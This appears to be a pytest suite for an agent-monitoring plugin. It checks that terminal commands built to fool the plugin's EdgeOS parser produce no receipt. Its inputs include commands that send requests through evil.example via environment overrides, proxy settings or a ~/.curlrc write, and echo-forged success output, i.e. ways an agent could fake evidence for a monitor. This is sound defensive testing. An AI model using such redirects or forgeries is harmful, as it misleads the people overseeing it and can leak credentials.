"""A receipt only for the EdgeOS call that actually ran (DATA-269).

Each case here is a parser differential between `_edgeos.http_call` and the
shell or curl: a command the plugin read as an EdgeOS call while the shell
ran something else. The fixture output is what the other host (or the
command) would print; the test shows the plugin no longer emits any
`action.*` event for it and leaves the `tool.call` without an EdgeOS label.
"""

from __future__ import annotations

import json
import uuid

import pytest

SESSION = "sess-edge"
EVENT = "5f0c7a3e-1b2d-4c3e-8f9a-0b1c2d3e4f5a"
API = "https://api.edgeos.world/api/v1"
EVIL = "https://evil.example/api/v1"
REGISTER = f"/event-participants/portal/register/{EVENT}"
READ = f"/events/portal/events/{EVENT}"
REGISTER_URL = f"{API}{REGISTER}"
READ_URL = f"{API}{READ}"
REGISTERED = {"id": EVENT, "my_rsvp_status": "registered"}
BASE = '"${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1}'


def terminal_result(body, exit_code=0):
    output = body if isinstance(body, str) else json.dumps(body)
    return json.dumps({"output": output, "exit_code": exit_code, "error": None})


def participant():
    return {"id": str(uuid.uuid4()), "event_id": EVENT, "status": "registered"}


def fire(ctx, command, body, call_id):
    ctx.fire("post_tool_call", session_id=SESSION, task_id="t", turn_id="turn-1", tool_name="terminal",
             args={"command": command}, result=terminal_result(body), tool_call_id=call_id, duration_ms=5,
             status="ok")


def of_type(av, plugin, *types):
    return [e for e in av.read_buffer(plugin._COLLECTOR) if e["event_type"] in types]


def action_events(av, plugin):
    return of_type(av, plugin, "action.attempted", "action.failed", "action.receipted")


def labels(av, plugin):
    return [e["payload"]["operation"] for e in of_type(av, plugin, "tool.call")]


@pytest.fixture()
def live(plugin, ctx, monkeypatch):
    monkeypatch.setenv("AV_EVENTS_TOKEN", "test-token")
    monkeypatch.delenv("EDGEOS_API_BASE", raising=False)
    plugin.register(ctx)
    ctx.fire("on_session_start", session_id=SESSION, model="m", platform="telegram")
    return plugin


@pytest.fixture()
def edgeos(plugin):
    return __import__(f"{plugin.__name__}._edgeos", fromlist=["_edgeos"])


def classify(edgeos, command):
    call = edgeos.http_call("terminal", {"command": command})
    matched = edgeos.match_operation(call) if call is not None else None
    return matched[0].operation if matched else None


def forged_pair(ctx, rsvp_command, read_command):
    """An RSVP answered with a participant record, then a read answered
    `registered`: the two outputs a forger's server (or `echo`) prints."""
    fire(ctx, rsvp_command, participant(), "c1")
    fire(ctx, read_command, REGISTERED, "c2")


def assert_no_receipt_and_no_label(av, live):
    assert action_events(av, live) == []
    assert labels(av, live) == [None, None]


# --------------------------------------------------------------------------
# Forgery 1 — the base reference (regression from ec61470)
# --------------------------------------------------------------------------


@pytest.mark.parametrize("label,rsvp,read", [
    ("foreign default",
     f'curl -s -X POST "${{EDGEOS_API_BASE:-{EVIL}}}{REGISTER}"',
     f'curl -s "${{EDGEOS_API_BASE:-{EVIL}}}{READ}"'),
    # No scheme: curl assumes http://, and no `https://` word gives the host away.
    ("export before the curl",
     f'export EDGEOS_API_BASE=evil.example/api/v1; curl -s -X POST "$EDGEOS_API_BASE{REGISTER}"',
     f'export EDGEOS_API_BASE=evil.example/api/v1; curl -s "$EDGEOS_API_BASE{READ}"'),
    ("export, then the default form",
     f'export EDGEOS_API_BASE=evil.example/api/v1; curl -s -X POST {BASE}{REGISTER}"',
     f'export EDGEOS_API_BASE=evil.example/api/v1; curl -s {BASE}{READ}"'),
    ("unset then the default",
     f'unset EDGEOS_API_BASE; curl -s -X POST "${{EDGEOS_API_BASE:-{EVIL}}}{REGISTER}"',
     f'unset EDGEOS_API_BASE; curl -s "${{EDGEOS_API_BASE:-{EVIL}}}{READ}"'),
    ("assignment prefix",
     f'EDGEOS_API_BASE=evil.example/api/v1 curl -s -X POST "${{EDGEOS_API_BASE}}{REGISTER}"',
     f'EDGEOS_API_BASE={EVIL} curl -s "${{EDGEOS_API_BASE}}{READ}"'),
    ("assignment prefix, braces",
     f'EDGEOS_API_BASE={EVIL} curl -s -X POST {BASE}{REGISTER}"',
     f'EDGEOS_API_BASE={EVIL} curl -s {BASE}{READ}"'),
])
def test_a_base_reference_that_can_point_elsewhere_is_not_read(live, ctx, av, label, rsvp, read):
    forged_pair(ctx, rsvp, read)
    assert_no_receipt_and_no_label(av, live)


@pytest.mark.parametrize("expansion", [
    "${EDGEOS_API_BASE:=https://evil.example/api/v1}",
    "${EDGEOS_API_BASE:+https://evil.example/api/v1}",
    "${EDGEOS_API_BASE:?https://api.edgeos.world/api/v1}",
    "${EDGEOS_API_BASE-https://api.edgeos.world/api/v1}",
    "${EDGEOS_API_BASE#https://}",
    "${EDGEOS_API_BASE%/v1}",
    "${EDGEOS_API_BASE:-${OTHER:-https://api.edgeos.world/api/v1}}",
    "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1/}x",
    "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v2}",
    "${EDGEOS_API_BASE:-https://api.edgeos.world:8443/api/v1}",
    "${EDGEOS_API_BASE:-http://api.edgeos.world/api/v1}",
    "${EDGEOS_API_BASE:-https://x@api.edgeos.world/api/v1}",
    "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1?a=1}",
    "${EDGEOS_API_BASE:-'https://api.edgeos.world/api/v1'}",
    "${EDGEOS_API_BASE:-}",
    "${EDGEOS_API_BASEX:-https://api.edgeos.world/api/v1}",
    "$EDGEOS_API_BASEX",
    "${!EDGEOS_API_BASE}",
])
def test_only_the_recipe_forms_of_the_base_are_read(edgeos, monkeypatch, expansion):
    monkeypatch.setenv("EDGEOS_API_BASE", API)
    assert classify(edgeos, f'curl -s -X POST "{expansion}{REGISTER}"') is None


@pytest.mark.parametrize("default,expected", [
    ("https://api.edgeos.world/api/v1", "edgeos.rsvp"),
    ("HTTPS://API.EDGEOS.WORLD/api/v1", "edgeos.rsvp"),
    # Equal after normalisation, so accepted; but the shell then sends
    # `…/v1//event-participants/…`, which is no operation's path.
    ("https://api.edgeos.world/api/v1/", None),
])
def test_the_default_form_with_the_plugins_default_is_read(edgeos, monkeypatch, default, expected):
    monkeypatch.delenv("EDGEOS_API_BASE", raising=False)
    assert classify(edgeos, f'curl -s -X POST "${{EDGEOS_API_BASE:-{default}}}{REGISTER}"') == expected


@pytest.mark.parametrize("env,form,expected", [
    # The plugin's own base, unset: only the default form names a host.
    (None, "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1}", "edgeos.rsvp"),
    (None, "${EDGEOS_API_BASE}", None),
    (None, "$EDGEOS_API_BASE", None),
    ("", "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1}", "edgeos.rsvp"),
    ("", "$EDGEOS_API_BASE", None),
    # Set to production: every recipe form.
    (API, "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1}", "edgeos.rsvp"),
    (API, "${EDGEOS_API_BASE}", "edgeos.rsvp"),
    (API, "$EDGEOS_API_BASE", "edgeos.rsvp"),
    ("https://api.edgeos.world:443/api/v1", "$EDGEOS_API_BASE", "edgeos.rsvp"),
    # Set to anything that is not an allowed EdgeOS authority: nothing is read.
    ("https://edgeos-dev.example.test/api/v1", "${EDGEOS_API_BASE:-https://api.edgeos.world/api/v1}", None),
    ("https://edgeos-dev.example.test/api/v1", "$EDGEOS_API_BASE", None),
    ("http://127.0.0.1:8000/api/v1", "${EDGEOS_API_BASE}", None),
    ("http://api.edgeos.world/api/v1", "${EDGEOS_API_BASE}", None),
    ("https://api.edgeos.world:8443/api/v1", "${EDGEOS_API_BASE}", None),
    (" https://api.edgeos.world/api/v1", "${EDGEOS_API_BASE}", None),
    ("https://api.edgeos.world/api/v1 https://evil.example/x", "$EDGEOS_API_BASE", None),
    ("https://x@api.edgeos.world/api/v1", "${EDGEOS_API_BASE}", None),
])
def test_the_base_is_the_plugins_own_and_must_be_edgeos(edgeos, monkeypatch, env, form, expected):
    if env is None:
        monkeypatch.delenv("EDGEOS_API_BASE", raising=False)
    else:
        monkeypatch.setenv("EDGEOS_API_BASE", env)
    assert classify(edgeos, f'curl -s -X POST "{form}{REGISTER}"') == expected


def test_a_literal_url_on_the_plugins_dev_base_is_not_edgeos(edgeos, monkeypatch):
    # Before DATA-269 the plugin's own base authority was allowed as a literal
    # host too; now only the allowlist's hosts are EdgeOS.
    monkeypatch.setenv("EDGEOS_API_BASE", "https://edgeos-dev.example.test/api/v1")
    assert classify(edgeos, f"curl -s -X POST https://edgeos-dev.example.test/api/v1{REGISTER}") is None
    assert classify(edgeos, f"curl -s -X POST {REGISTER_URL}") == "edgeos.rsvp"


# --------------------------------------------------------------------------
# Forgery 2 — something before the curl decides whether it runs
# --------------------------------------------------------------------------


@pytest.mark.parametrize("label,prefix", [
    ("echo then true ||", f"echo '{json.dumps(REGISTERED)}'; true || "),
    ("exit 0;", "exit 0; "),
    ("false &&", "false && "),
    ("cd &&", "cd /tmp && "),
    ("cd ;", "cd /tmp; "),
    ("newline", "echo hi\n"),
    ("subshell", "( "),
    ("export HTTPS_PROXY", "export HTTPS_PROXY=http://evil.example:8080; "),
    ("HTTPS_PROXY prefix", "HTTPS_PROXY=http://evil.example:8080 "),
    ("curlrc write", "echo 'proxy = http://evil.example:8080' > ~/.curlrc; "),
    ("curlrc write &&", "printf 'url = https://evil.example/x\\n' >> ~/.curlrc && "),
    ("env", "env "),
    ("command", "command "),
    ("exec", "exec "),
    ("if", "if true; then "),
])
def test_only_a_curl_that_is_the_whole_command_is_read(live, ctx, av, label, prefix):
    suffix = "; fi" if label == "if" else (" )" if label == "subshell" else "")
    forged_pair(ctx, f"{prefix}curl -s -X POST {REGISTER_URL}{suffix}", f"{prefix}curl -s {READ_URL}{suffix}")
    assert_no_receipt_and_no_label(av, live)


@pytest.mark.parametrize("label,rsvp,read", [
    ("terminated", f"cat <<EOF\ncurl -s -X POST {REGISTER_URL}\nEOF", f"cat <<'EOF'\ncurl -s {READ_URL}\nEOF"),
    # Unterminated: the shell ends the here-document at the end of input, so
    # the last line is text, not a command.
    ("unterminated", f"echo '{json.dumps(participant())}'; cat <<EOF\ncurl -s -X POST {REGISTER_URL}",
     f"echo '{json.dumps(REGISTERED)}'; cat <<EOF\ncurl -s {READ_URL}"),
])
def test_a_curl_line_inside_a_here_document_is_not_read(live, ctx, av, label, rsvp, read):
    forged_pair(ctx, rsvp, read)
    assert_no_receipt_and_no_label(av, live)


def test_a_leading_here_document_is_not_read(edgeos):
    assert classify(edgeos, f"<<EOF curl -s {READ_URL}\nx\nEOF") is None


@pytest.mark.parametrize("command", [
    f"/usr/bin/curl -s -X POST {REGISTER_URL}",
    f"./curl -s -X POST {REGISTER_URL}",
    f"/tmp/x/curl -s -X POST {REGISTER_URL}",
    f"curl2 -s -X POST {REGISTER_URL}",
])
def test_curl_is_the_word_curl_and_nothing_else(edgeos, command):
    # A path to `curl` can be any program the agent wrote.
    assert classify(edgeos, command) is None


def test_leading_whitespace_runs_nothing(edgeos):
    assert classify(edgeos, f"  \n curl -s -X POST {REGISTER_URL}") == "edgeos.rsvp"


# --------------------------------------------------------------------------
# Lower: curl options and argument forms curl reads differently
# --------------------------------------------------------------------------


@pytest.mark.parametrize("command", [
    f"curl -s --variable host=evil.example --expand-url 'https://{{{{host}}}}/x' {REGISTER_URL} -X POST",
    f"curl -s --variable x=1 -X POST {REGISTER_URL}",
    f"curl -s --expand-url {REGISTER_URL} -X POST",
    f"curl -s --expand-header 'X: {{{{x}}}}' -X POST {REGISTER_URL}",
    f"curl -s -I {READ_URL}",
    f"curl -sI {READ_URL}",
    f"curl -s --head {READ_URL}",
    f"curl -s -X post {REGISTER_URL}",
    f"curl -s -X Post {REGISTER_URL}",
    f"curl -s --request post {REGISTER_URL}",
    f"curl -s -X 'POST ' {REGISTER_URL}",
    f"curl -s -X HEAD {READ_URL}",
    f"curl -s --request=POST {REGISTER_URL}",
    f"curl -s --url={REGISTER_URL} -X POST",
    f"curl -s -X POST --data='{{}}' {REGISTER_URL}",
    f"curl -s --unix-socket /tmp/s -X POST {REGISTER_URL}",
    f"curl -s --abstract-unix-socket s -X POST {REGISTER_URL}",
    f"curl -s --dns-servers 10.0.0.1 -X POST {REGISTER_URL}",
    f"curl -s --cacert /tmp/ca.pem -X POST {REGISTER_URL}",
    f"curl -s --capath /tmp/ca -X POST {REGISTER_URL}",
    f"curl -s --socks4 evil.example:1080 -X POST {REGISTER_URL}",
    f"curl -s --proxy1.0 evil.example:8080 -X POST {REGISTER_URL}",
    f"curl -s --version -X POST {REGISTER_URL}",
    f"curl -s -V -X POST {REGISTER_URL}",
    f"curl -s -G --data-urlencode occurrence_start=2026-10-20T10:00:00Z {READ_URL}",
    f"curl -s -G -d occurrence_start=2026-10-20T10:00:00Z {READ_URL}",
])
def test_curl_options_the_plugin_cannot_follow_are_not_read(edgeos, command):
    assert classify(edgeos, command) is None


@pytest.mark.parametrize("command", [
    # A comment starts only at the start of a word: inside one, `#` is a
    # literal and what follows on the line is still arguments.
    f"curl -s -o /dev/null {READ_URL}#x https://evil.example/f",
    f"curl -s {READ_URL} # a note",
    # To the shell `-H` has no value here (the rest is a comment): no request.
    f"curl -s -X POST -H #x {REGISTER_URL}",
    # Expansions the plugin does not perform.
    f"curl -s -o /dev/null {READ_URL} -H x${{IFS}}https:/$Z/evil.example/f",
    f'curl -s "{READ_URL}" -H "X: $HOME"',
    f"curl -s $'{READ_URL}'",
    f'curl -s $"{READ_URL}"',
    f"curl -s {READ_URL} $OPTS",
    # Brace and pathname expansion.
    f"curl -s -X POST -H {{x,https:/{{/,}}evil.example/f}} {REGISTER_URL}",
    f"curl -s {API}/events/portal/events?popup_id={EVENT}",
    f"curl -s {READ_URL} -H x*",
    f"curl -s {READ_URL} -H [x]",
    # A carriage return before a newline is an escaped CR, then a new command.
    f"curl -s -X POST {REGISTER_URL} \\\r\necho '{json.dumps(REGISTERED)}'",
    # A carriage return is no whitespace to the shell: here it is an unknown
    # short option to curl, which then sends nothing.
    f"curl -s\r -X POST {REGISTER_URL}",
    # An escaped backslash before a newline: the newline ends the command.
    f"curl -s {READ_URL} -H x\\\\\necho hi",
    # Whitespace or a control character in the URL.
    f'curl -s -X POST "{API}/event-participants/portal/register/\t{EVENT}"',
    f"curl -s -X POST '{API}/event-participants/portal/register/\\\n{EVENT}'",
    "curl -s -X POST \"" + REGISTER_URL + "\x00\"",
    # curl rejects a URL with a space or a control character and sends nothing.
    f'curl -s "{READ_URL}?occurrence_start=a b"',
    f'curl -s "{READ_URL}?occurrence_start=\x01"',
    f'curl -s "{READ_URL}?occurrence_start=\x7f"',
    # Unclosed quotes and a trailing backslash.
    f'curl -s "{READ_URL}',
    f"curl -s {READ_URL} \\",
])
def test_shell_forms_the_plugin_does_not_reproduce_are_not_read(edgeos, command):
    assert classify(edgeos, command) is None


def test_a_continuation_joins_with_nothing_as_the_shell_does(edgeos):
    # Inside double quotes and unquoted, backslash-newline is removed outright.
    assert classify(edgeos, f'curl -s -X POST "{API}/event-participants/portal/register/\\\n{EVENT}"') == "edgeos.rsvp"
    assert classify(edgeos, f"curl -s -X POST {API}/event-participants/portal/register/\\\n{EVENT}") == "edgeos.rsvp"
    # A word split across a continuation stays one word: `-X PO\<nl>ST` is POST.
    assert classify(edgeos, f"curl -s -X PO\\\nST {REGISTER_URL}") == "edgeos.rsvp"
    # Before DATA-269 a continuation became a space; a URL split that way
    # read as two arguments where the shell sends one.
    assert classify(edgeos, f"cu\\\nrl -s {READ_URL}") == "edgeos.event_read"


@pytest.mark.parametrize("header", [
    '"Authorization: Bearer $EDGEOS_API_KEY"',
    '"Authorization: Bearer ${EDGEOS_API_KEY}"',
    '"Authorization: Bearer $EDGEOS_BEARER_TOKEN"',
    '"Authorization: Bearer ${EDGEOS_BEARER_TOKEN}"',
    "'Authorization: Bearer $EDGEOS_API_KEY'",  # single quotes: a literal, as in the shell
    '"X: costs \\$5"',  # an escaped dollar is not an expansion
])
def test_the_credential_variables_may_be_named_inside_double_quotes(edgeos, header):
    assert classify(edgeos, f'curl -s -H {header} "{READ_URL}"') == "edgeos.event_read"


@pytest.mark.parametrize("header", [
    "Authorization:$EDGEOS_API_KEY",  # unquoted: word splitting
    '"Authorization: Bearer $EDGEOS_API_KEYS"',
    '"Authorization: Bearer ${EDGEOS_API_KEY:-x}"',
    '"Authorization: Bearer $AV_EVENTS_TOKEN"',
])
def test_any_other_expansion_is_not_read(edgeos, header):
    assert classify(edgeos, f'curl -s -H {header} "{READ_URL}"') is None


# --------------------------------------------------------------------------
# Output that is not the response body
# --------------------------------------------------------------------------


@pytest.mark.parametrize("option", [
    "-o /dev/null -w '{\"id\":\"%s\",\"my_rsvp_status\":\"registered\"}'",
    "-w '\\n{\"id\":\"x\"}'",
    "--write-out x",
    "-o /dev/null",
    "--output /dev/null",
    "-O",
    "--remote-name",
    "--remote-name-all",
    "--output-dir /tmp -O",
    "-D -",
    "--dump-header -",
    "-i",
    "--include",
    "-v",
    "--verbose",
    "--trace -",
    "--trace-ascii -",
    "--stderr - -v",
    "--libcurl -",
])
def test_a_read_whose_output_is_rewritten_confirms_nothing(live, ctx, av, option):
    body = participant()
    fire(ctx, f"curl -s -X POST {REGISTER_URL}", body, "c1")
    fire(ctx, f"curl -s {option} {READ_URL}", REGISTERED, "c2")
    # Labelled, as a `| jq` read is; never a receipt.
    assert labels(av, live) == ["edgeos.rsvp", "edgeos.event_read"]
    assert of_type(av, live, "action.receipted") == []
    assert len(live._COLLECTOR.edgeos.pending) == 1


@pytest.mark.parametrize("option", [
    "-o /dev/null -w '{\"id\":\"%s\",\"event_id\":\"%s\"}'",
    "-w x",
    "-v",
    "--include",
])
def test_an_rsvp_whose_output_is_rewritten_waits_on_nothing(live, ctx, av, option):
    fire(ctx, f"curl -s {option} -X POST {REGISTER_URL}", participant(), "c1")
    assert [e["event_type"] for e in action_events(av, live)] == ["action.attempted"]
    assert live._COLLECTOR.edgeos.pending == {}
    fire(ctx, f"curl -s {READ_URL}", REGISTERED, "c2")
    assert of_type(av, live, "action.receipted") == []


# --------------------------------------------------------------------------
# Full matches: a trailing newline is not part of a UUID or a path
# --------------------------------------------------------------------------


def test_a_uuid_with_a_trailing_newline_is_not_a_uuid(edgeos):
    assert edgeos.participant_record({"id": str(uuid.uuid4()) + "\n", "event_id": EVENT}, EVENT) is None
    assert edgeos.rsvp_statuses({"id": EVENT + "\n", "my_rsvp_status": "registered"}, {}) == []
    assert edgeos.UUID_RE.fullmatch(EVENT) is not None


def test_a_path_with_a_trailing_newline_matches_no_operation(edgeos):
    assert edgeos.match_operation(edgeos.HttpCall("POST", REGISTER_URL[len("https://api.edgeos.world"):] + "\n", {})) is None
    assert edgeos.match_operation(edgeos.HttpCall("POST", f"/api/v1{REGISTER}", {}))[0].operation == "edgeos.rsvp"


def test_a_ledger_entry_with_a_trailing_newline_is_dropped(edgeos):
    ledger = edgeos.Ledger()
    good = {"action_id": "0190f0f0-0000-7000-8000-000000000000", "action_class": "rsvp", "at": 1.0,
            "reversal": False, "reverses_action_id": None, "participant_id": str(uuid.uuid4())}
    assert edgeos._valid_pending(good)
    assert not edgeos._valid_pending({**good, "participant_id": good["participant_id"] + "\n"})
    assert not edgeos._valid_key(f"{EVENT}\n|")
